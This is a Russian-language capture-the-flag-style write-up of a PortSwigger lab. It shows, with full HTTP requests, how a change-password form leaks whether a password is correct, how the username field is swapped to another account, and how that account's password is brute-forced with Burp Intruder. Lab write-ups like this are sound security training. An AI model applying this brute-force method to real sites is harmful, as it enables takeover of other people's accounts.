---
title: "Password brute-force via password change"
date: 2025-10-02
tags: [web, authentication, writeup]  
categories: [PortSwigger]
tagline: ""
header:
  overlay_image: /assets/images/IMG_writeups/IMG_PortSwigger/ps_logo.webp
  overlay_filter: 0.5 
  overlay_color: "#fff"
  actions:
    - label: "Lab PortSwigger"
      url: "https://portswigger.net/web-security/authentication/other-mechanisms/lab-password-brute-force-via-password-change"
classes: wide
---

Для решения лабы нужно подобрать пароль для учетной записи `carlos`. Для входа в нашу учетную запись есть данные `wiener`:`peter`.

```
https://0a8500a30387741780671273009f0087.web-security-academy.net/
```

## Solution

Как всегда начну с осмотра страницы.

После того, как я зашел в свой аккаунт, я нашел форму для смены пароля. Вот `HTTP`-запрос, который для этого используется:

```http
POST /my-account/change-password HTTP/2
Host: 0a8500a30387741780671273009f0087.web-security-academy.net
Cookie: session=wTJv7cU5bzvDRXqcZ4JOr9mJQ4Rpmj13
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:143.0) Gecko/20100101 Firefox/143.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://0a8500a30387741780671273009f0087.web-security-academy.net/my-account/
Content-Type: application/x-www-form-urlencoded
Content-Length: 80
Origin: https://0a8500a30387741780671273009f0087.web-security-academy.net
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Priority: u=0, i
Te: trailers

username=wiener&current-password=peter&new-password-1=peter&new-password-2=peter
```

Так, а что будет, если ввести неправильный пароль? Попробую:

![IMG](/assets/images/IMG_writeups/IMG_PortSwigger/IMG_authentication/IMG_Password_brute-force_via_password_change/1.png){: height="200" .align-center}

Хех, на меня обиделись. Подождем-с... После не хитрых манипуляций я обнаружил следующее: eсли мы вводим неверный пароль в поле `current-password`, то нас выкидывает на форму ввода пароля, а затем блокирует попытки ввода. Но если мы заполним это поле корректно, а значения `new-password-1` и `new-password-2` будут отличаться, то сайт вернет следующую ошибку:

![IMG](/assets/images/IMG_writeups/IMG_PortSwigger/IMG_authentication/IMG_Password_brute-force_via_password_change/2.png){: height="200" .align-center}

Вот так выглядит сам запрос:

```http
POST /my-account/change-password HTTP/2
Host: 0a8500a30387741780671273009f0087.web-security-academy.net
Cookie: session=wTJv7cU5bzvDRXqcZ4JOr9mJQ4Rpmj13
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:143.0) Gecko/20100101 Firefox/143.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://0a8500a30387741780671273009f0087.web-security-academy.net/my-account/
Content-Type: application/x-www-form-urlencoded
Content-Length: 80
Origin: https://0a8500a30387741780671273009f0087.web-security-academy.net
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Priority: u=0, i
Te: trailers

username=wiener&current-password=peter&new-password-1=peter&new-password-2=peter
```

Но все это не имеет смыла, если не получится заменить имя в поле `username`)

![IMG](/assets/images/IMG_writeups/IMG_PortSwigger/IMG_authentication/IMG_Password_brute-force_via_password_change/3.jpg){: height="200" .align-center}

```http
POST /my-account/change-password HTTP/2
Host: 0a8500a30387741780671273009f0087.web-security-academy.net
Cookie: session=MUllgmU7TYrHlt3H53Bq2YfXIgr0TNhg; session=3qG31h62rRMonzEd2NtHF04ydCOBjU5b
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:143.0) Gecko/20100101 Firefox/143.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://0a8500a30387741780671273009f0087.web-security-academy.net/my-account?id=wiener
Content-Type: application/x-www-form-urlencoded
Content-Length: 76
Origin: https://0a8500a30387741780671273009f0087.web-security-academy.net
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Priority: u=0, i
Te: trailers

username=carlos&current-password=peter&new-password-1=111&new-password-2=222
```

Огонь:

![IMG](/assets/images/IMG_writeups/IMG_PortSwigger/IMG_authentication/IMG_Password_brute-force_via_password_change/4.png){: height="200" .align-center}

Закину запрос в `Inruder`, чтобы попытаться перебрать пароли. Составлю атаку `Sniper` со [списом паролей](https://portswigger.net/web-security/authentication/auth-lab-passwords):

```http
POST /my-account/change-password HTTP/2
Host: 0a8500a30387741780671273009f0087.web-security-academy.net
Cookie: session=MUllgmU7TYrHlt3H53Bq2YfXIgr0TNhg; session=3qG31h62rRMonzEd2NtHF04ydCOBjU5b
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:143.0) Gecko/20100101 Firefox/143.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://0a8500a30387741780671273009f0087.web-security-academy.net/my-account?id=wiener
Content-Type: application/x-www-form-urlencoded
Content-Length: 76
Origin: https://0a8500a30387741780671273009f0087.web-security-academy.net
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Priority: u=0, i
Te: trailers

username=carlos&current-password=§passwd§&new-password-1=111&new-password-2=222
```

Чтобы найти нужный пароль, применю фильтр по строке `New passwords do not match`. А вот:

![IMG](/assets/images/IMG_writeups/IMG_PortSwigger/IMG_authentication/IMG_Password_brute-force_via_password_change/5.png){: height="200" .align-center}

Пароль подошел:

![IMG](/assets/images/IMG_writeups/IMG_PortSwigger/IMG_authentication/IMG_Password_brute-force_via_password_change/6.png){: height="200" .align-center}
